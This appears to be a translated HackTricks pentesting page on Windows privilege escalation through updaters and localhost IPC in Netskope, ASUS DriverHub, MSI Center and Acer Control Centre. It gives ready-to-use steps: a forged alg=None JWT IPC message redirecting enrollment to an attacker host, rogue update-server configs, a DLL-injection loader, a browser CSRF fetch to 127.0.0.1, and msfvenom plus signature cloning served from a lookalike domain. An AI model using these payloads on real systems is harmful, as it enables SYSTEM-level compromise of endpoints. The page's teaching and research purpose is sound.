# Misbruik van Enterprise Auto-Updaters en Bevoorregte IPC (bv. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy veralgemeen 'n klas Windows local privilege escalation-kettinge wat in enterprise endpoint-agente en updaters gevind word wat 'n laag\-drempel IPC-oppervlak en 'n bevoorregte opdateringsvloei blootstel. 'n Verteenwoordigende voorbeeld is Netskope Client for Windows < R129 (CVE-2025-0309), waar 'n low\-privileged gebruiker gedwing kan word om inskrywing by 'n deur 'n aanvaller beheerde bediener te maak en daarna 'n kwaadwillige MSI aan te lewer wat die SYSTEM-diens installeer.

Sleutelidees wat jy teen soortgelyke produkte kan hergebruik:
- Misbruik 'n bevoorregte diens se localhost IPC om her\-inskrywing of herkonfigurasie na 'n aanvaller-bediener af te dwing.
- Implementeer die verskaffer se update-eindpunte, lewer 'n rogue Trusted Root CA, en wys die updater na 'n kwaadwillige, “signed” pakket.
- Ontduik swak signer kontroles (CN allow\-lists), opsionele digest-vlagte, en laks MSI-eienskappe.
- As IPC “encrypted” is, lei die key/IV af uit world\-readable masjienidentifiseerders wat in die registry gestoor is.
- As die diens aanroepers beperk volgens image path/process name, injekteer in 'n allow\-listed proses of spawn een suspended en bootstrap jou DLL via 'n minimale thread\-context patch.

---
## 1) Afdwing van inskrywing na 'n aanvaller-bediener via localhost IPC

Baie agente lewer 'n user-mode UI-proses wat oor localhost TCP met 'n SYSTEM-diens kommunikeer met JSON.

Waargeneem in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Uitbuitingsvloei:
1) Maak 'n JWT enrollment-token waarvan die eise die backend-host beheer (bv. AddonUrl). Gebruik alg=None sodat geen handtekening vereis word nie.
2) Stuur die IPC-boodskap wat die provisioning-opdrag aanroep met jou JWT en tenant\-name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Die diens begin jou kwaadwillige bediener raadpleeg vir enrollment/config, e.g.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Nota:
- As caller verification is path/name\-based, laat die versoek afkomstig wees van 'n allow\-listed vendor binary (sien §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Sodra die kliënt met jou bediener kommunikeer, implementeer die verwagte endpoints en lei dit na 'n aanvallers MSI. Tipiese volgorde:

1) /v2/config/org/clientconfig → Stuur 'n JSON-config terug met 'n baie kort opdateringsinterval, bv.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: die diens mag slegs kyk of die Subject CN gelyk is aan “netSkope Inc” of “Netskope, Inc.”. Jou rogue CA kan 'n leaf met daardie CN uitreik en die MSI teken.
- CERT_DIGEST property: sluit 'n goedaardige MSI property met die naam CERT_DIGEST in. Geen afdwinging tydens installasie nie.
- Optional digest enforcement: konfigurasievlag (e.g., check_msi_digest=false) skakel ekstra kriptografiese validering af.

Result: die SYSTEM-diens installeer jou MSI van
C:\ProgramData\Netskope\stAgent\data\*.msi
en voer arbitrêre kode uit as NT AUTHORITY\SYSTEM.

---
## 3) Vervalste versleutelde IPC-versoeke (wanneer teenwoordig)

Vanaf R127 het Netskope die IPC JSON toegedraai in 'n encryptData veld wat soos Base64 lyk. Reversing het gewys dat AES met key/IV gebruik is wat afgelei is van registerwaardes wat deur enige gebruiker gelees kan word:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Aanvallers kan die enkripsie reproduseer en geldige versleutelde opdragte stuur vanaf 'n gewone gebruiker. Algemene wenk: as 'n agent skielik sy IPC “encrypts”, kyk vir device IDs, product GUIDs, install IDs onder HKLM as materiaal.

---
## 4) Omseiling van IPC caller allow\-lists (pad/naam kontroles)

Sommige dienste probeer die peer verifieer deur die TCP-verbinding se PID op te los en die image path/name te vergelyk teen allow\-listed vendor binaries geleë onder Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese omseilings:
- DLL injection in 'n allow\-listed proses (e.g., nsdiag.exe) en proxy IPC van binne daarvan.
- Spawn 'n allow\-listed binary in suspended toestand en bootstrap jou proxy DLL sonder CreateRemoteThread (see §5) om driver\-afgedwingde tamper-reëls te bevredig.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Produkte word dikwels saam met 'n minifilter/OB callbacks driver (e.g., Stadrv) verskaf om gevaarlike regte van handles na beskermde prosesse af te haal:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

'n Betroubare user\-mode loader wat aan hierdie beperkings voldoen:
1) CreateProcess of 'n vendor binary met CREATE_SUSPENDED.
2) Verkry handles waartoe jy nog toestemming het: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die proses, en 'n thread handle met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy kode op 'n bekende RIP patch).
3) Oorskryf ntdll!NtContinue (of ander vroeë, guaranteed\-mapped thunk) met 'n klein stub wat LoadLibraryW op jou DLL path aanroep, en dan terugspring.
4) ResumeThread om jou stub in-proses te trigger en jou DLL te laai.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op 'n reeds\-beskermde proses gebruik het nie (jy het dit geskep), is die driver se beleid bevredig.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is 'n custom IPC client wat arbitrêre (optioneel AES\-encrypted) IPC messages skep en die suspended\-process injection insluit om vanaf 'n allow\-listed binary te originate.

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub lewer 'n user\-mode HTTP service (ADU.exe) op 127.0.0.1:53000 wat verwag dat blaaier-oproepe vanaf https://driverhub.asus.com sal kom. Die origin filter voer eenvoudig `string_contains(".asus.com")` uit oor die Origin header en oor download URLs blootgestel deur `/asus/v1.0/*`. Enige attacker\-controlled host soos `https://driverhub.asus.com.attacker.tld` slaag dus die check en kan state\-changing versoeke vanaf JavaScript uitstuur. Sien [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) vir addisionele omseilpatrone.

Praktiese vloei:
1) Registreer 'n domein wat `.asus.com` embed en host 'n kwaadwillige webblad daar.
2) Gebruik `fetch` of XHR om 'n bevoorregte endpoint (e.g., `Reboot`, `UpdateApp`) op `http://127.0.0.1:53000` aan te roep.
3) Stuur die JSON body wat deur die handler verwag word – die gepakte frontend JS wys die skema hieronder.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Selfs die PowerShell CLI wat hieronder getoon word, slaag wanneer die Origin header spoofed is na die betroubare waarde:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1\-click (or 0\-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

Om die vloei uit te buit:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Omdat beide die Origin- en URL-filters substring\-gebaseer is en die signer-check net strings vergelyk, trek DriverHub die aanvaler-binary en voer dit uit onder sy verhoogde konteks.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker\-controlled arguments.

Die gekopieerde lêer word nie tussen verifikasie en `ExecuteTask()` gegrendel nie. ’n Aanvaller kan:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

Wanneer die scheduler afgaan, voer dit die oor-skryfde payload as SYSTEM uit ondanks dat die oorspronklike lêer gevalideer is. Betroubare uitbuiting gebruik twee goroutines/threads wat CMD_AutoUpdateSDK spam totdat die TOCTOU-venster gewen word.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

Hierdie IPC-bugs beklemtoon waarom localhost-dienste wedersydse verifikasie (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) moet afdwing en waarom elke module se “run arbitrary binary” hulpprogram dieselfde signer-verifikasies moet deel.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
